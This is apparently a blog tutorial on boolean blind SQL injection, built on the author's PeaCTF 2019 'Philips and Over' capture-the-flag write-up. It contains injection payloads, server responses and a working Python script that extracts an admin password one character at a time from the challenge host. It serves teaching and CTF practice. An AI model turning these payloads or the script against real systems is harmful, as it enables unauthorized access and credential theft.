I"ê:<p>A guide detailing how a blind SQL injection attack works. It uses my <code class="highlighter-rouge">Philips and Over</code> challenge writeup from PeaCTF 2019 Qualifiers as an example.</p>

<h1 id="introduction">Introduction</h1>

<p>I recently participated in PeaCTF and came across <a href="/writeups/peactf/2019/07/28/peactf-all-challenges.html#philips-and-over">a very well made web exploitation challenge</a>. It required participants to perform a blind SQL injection attack to retrieve an admin password and successfully login to get the flag. I think writing an actual guide explaining the basic concept behind a regex-based blind SQL injection attack would prove useful to a lot of people since most of the guides Iâ€™ve found donâ€™t really explain it in too much depth.</p>

<p>Disclaimer: All the following will follow MySQL syntax. This attack can be adapted to any type of SQL with a little bit of work.</p>

<h1 id="what-is-a-blind-sql-injection">What is a Blind SQL Injection?</h1>

<p>If youâ€™ve done any introductory CTF web challenges, or any practice challenges on websites like wechall or hackerone, you will have come across SQL injections where a simple <code class="highlighter-rouge">'or 1=1 -- .</code> dumps information from the DB. This works because the output of the query is actually displayed on the page that you are on. A blind SQL injection is where an SQL injectable parameter/input still exists, however you donâ€™t actually get any output from the query itself.</p>

<h1 id="how-does-it-work">How does it work?</h1>

<p>In cases like this, the only information you <strong><em>can</em></strong> get is that your query either succeeded (returned TRUE) or failed (returned FALSE). This type of injection is usually found in GET parameters in the url, but can also be found in login forms and in some cases registration forms. You just have to fuzz all possible input fields to find this vulnerability.</p>

<p>I will use my <a href="/writeups/peactf/2019/07/28/peactf-all-challenges.html#philips-and-over">Philips and Over</a> writeup from the PeaCTF 2019 Qualifiers as a reference. When we change that debug field to 1, supply â€˜adminâ€™ as the username and â€˜asdâ€™ as the answer, we are given the following output from the server.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin'

Your answer to the security question is not correct. We have sent admin an email to notify this incident.
</code></pre></div></div>

<p>Looking at this query, we then try to see if an SQL injection actually exists by using <code class="highlighter-rouge">admin'</code> as the username.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'admin''" in /problems/philips-and-over_20_d1b6a0ae1a20d6684ef08d4e630276cc/webroot/result.php on line 65

username: admin'
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin''


Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /problems/philips-and-over_20_d1b6a0ae1a20d6684ef08d4e630276cc/webroot/result.php:74 Stack trace: #0 {main} thrown in /problems/philips-and-over_20_d1b6a0ae1a20d6684ef08d4e630276cc/webroot/result.php on line 74
</code></pre></div></div>

<p>Okay so we now know that the username field is indeed SQL injectable. However, we will also notice that a simple <code class="highlighter-rouge">admin' OR 1=1 -- .</code> wonâ€™t work.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin' OR 1=1 --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' OR 1=1 --.'

Your answer to the security question is not correct. We have sent admin' OR 1=1 --. an email to notify this incident.
</code></pre></div></div>

<p>This happens because the page doesnâ€™t actually return the output of the query itself. Rather it will either return TRUE or FALSE depending on the query. This can be verified using a boolean AND injection as follows.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># A TRUE query #

username: admin' AND 1=1 --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=1 --.'

Your answer to the security question is not correct. We have sent admin' AND 1=1 --. an email to notify this incident.

----------------------------------------------------------------------------------------------------------------------

# A FALSE query

username: admin' AND 1=2 --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=2 --.'

User does not exist.
</code></pre></div></div>

<p>As we can see, when we try <code class="highlighter-rouge">admin' AND 1=1 --.</code>, the query still returns TRUE, since the left side is true (admin is a valid user) and the right side is true (1=1). However, when we try <code class="highlighter-rouge">admin' AND 1=2 --.</code>, the query returns FALSE because even though admin is still a valid user, 1 != 2 therefore the entire query is false.</p>

<p>The key thing to note here is that the page gives us different results when we have a TRUE query vs when we have a FALSE query. A TRUE query has the text â€˜Your answer to the security questionâ€™ in the page, whereas a FALSE query just has â€˜User does not existâ€™. This is an important thing to note, and this is exactly what a blind SQL injection utilizes to get information from the database.</p>

<p>In this case, we want the password. We are already given the query, so what we can do is get the password out one character at a time. SQL has what we call â€˜wildcardsâ€™, of which there are two main ones that we can utilize. The wildcard â€˜%â€™ means any number of ascii characters, while the wildcard â€˜_â€™ means just one of any ascii character. For example, take the following query that returns TRUE.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '%') --.'

Your answer to the security question is not correct. We have sent admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '%') --. an email to notify this incident.
</code></pre></div></div>

<p>We make our queryâ€™s right hand side a SELECT statement that returns one column from the users table where the password is LIKE â€˜%â€™. the â€˜%â€™ means â€˜any number of charactersâ€™, therefore the SELECT statement does return 1, and our query can then be compacted down to <code class="highlighter-rouge">admin' AND 1=1 --.</code>, which returns TRUE. This works because the password is a bunch of characters (as passwords usually are).</p>

<p>What we can also do with a wildcard like â€˜%â€™ is test for strings like â€˜a%â€™, â€˜b%â€™, â€˜c%â€™, and etc, to find out what character the password begins with. An example is shown below.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'a%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'a%') --.'

User does not exist.

username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'b%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'a%') --.'

User does not exist.

......
......

username: admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '7%') --.
answer: asd
SQL query: SELECT password, answer FROM users WHERE username='admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '7%') --.'

Your answer to the security question is not correct. We have sent admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '7%') --. an email to notify this incident.
</code></pre></div></div>

<p>Once weâ€™ve tried all characters through a-z, then A-Z, then 0-9, we notice that â€˜7%â€™ returns a TRUE query. This tells us that the password starts with the character â€˜7â€™, and then ends with any number of characters due to the wildcard â€˜%â€™. The next time we do the query then, we can start again with â€˜7a%â€™, â€˜7b%â€™, etc, to find the second character. Rinse and repeat, and we will end up getting the entire password.</p>

<p>The python script I wrote to demonstrate this is shown below.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="c1"># Helper function to easily see the query
</span><span class="k">def</span> <span class="nf">blind</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s">"http://shell1.2019.peactf.com:61940/result.php"</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s">"username"</span><span class="p">:</span><span class="s">"admin' "</span> <span class="o">+</span><span class="n">query</span><span class="o">+</span> <span class="s">" -- ."</span><span class="p">,</span><span class="s">"answer"</span><span class="p">:</span><span class="s">"asd"</span><span class="p">,</span><span class="s">"debug"</span><span class="p">:</span><span class="s">"1"</span><span class="p">})</span>

    <span class="k">return</span> <span class="n">response</span>

<span class="n">keyspace</span> <span class="o">=</span> <span class="s">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&amp;*()-=+'</span>

<span class="n">query_left_side</span> <span class="o">=</span> <span class="s">"AND 1=(SELECT 1 FROM users WHERE password LIKE '"</span>

<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>

<span class="n">num_of_queries</span> <span class="o">=</span> <span class="n">num_of_true_queries</span> <span class="o">=</span> <span class="mi">0</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="n">num_of_queries</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">keyspace</span><span class="p">:</span>
    	<span class="c1"># query = admin' AND 1=(SELECT 1 FROM users WHERE password LIKE 'k%') -- .
</span>    	<span class="c1"># In the above, 'k' is each character that this loop tries
</span>        <span class="n">query</span> <span class="o">=</span> <span class="n">query_left_side</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="s">"</span><span class="si">%</span><span class="s">')"</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">blind</span><span class="p">(</span><span class="n">query</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">'</span><span class="se">\r</span><span class="s">Password: '</span><span class="o">+</span><span class="n">password</span><span class="o">+</span><span class="n">k</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">"Your answer to the security"</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span> <span class="c1"># If a TRUE query is returned on character k
</span>            <span class="n">num_of_true_queries</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">query_left_side</span> <span class="o">+=</span> <span class="n">k</span> <span class="c1"># Add the character to the query so we can continue with the next character
</span>            <span class="n">password</span> <span class="o">+=</span> <span class="n">k</span> <span class="c1"># Add the character to the password string
</span>            <span class="k">break</span>
    <span class="k">if</span> <span class="n">num_of_queries</span> <span class="o">!=</span> <span class="n">num_of_true_queries</span><span class="p">:</span>
        <span class="k">break</span>

<span class="k">print</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Password found!: "</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
</code></pre></div></div>

<p>Note that the script just automates what I explained above. It will start by creating the following query.</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">"admin' AND 1=(SELECT 1 FROM users WHERE password LIKE '"</span> <span class="o">+</span> <span class="n">k</span> <span class="o">+</span> <span class="s">"</span><span class="si">%</span><span class="s">') --."</span>
</code></pre></div></div>
<p>Where â€˜kâ€™ is the variable containing each letter we are testing. After each character, it checks to see if a TRUE query is returned by checking whether the text â€˜Your answer to the securityâ€™ is in the page. If it is, it will store it in the password variable, as well as add it to the query. Otherwise, it just continues with the next character.</p>

<p>The â€˜adding it to the queryâ€™ bit is the most important here, as that is what will make the query start at the next character. Running the script will give us the following output.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Â» ./sqli.py
Password: 70725064+
Password found!: 70725064
</code></pre></div></div>

<p>Once we use the password to login to the website as the â€˜adminâ€™ user, we get the flag.</p>

<h1 id="recap">Recap</h1>

<p>That was a demonstration of what a regex-based blind SQL injection attack looks like. We simply used the fact that the page gives us different results depending on whether the query it performs returns TRUE or FALSE. We leveraged that to get the password one character at a time. Do take a look at my writeup of <a href="/all/2019/07/28/peactf-all-challenges.html#philips-and-over">Philips and Over</a> from the PeaCTF 2019 Qualifiers, as well as any other writeups that you may want to check out.</p>

<p>Hope this guide helps someone out!</p>
:ET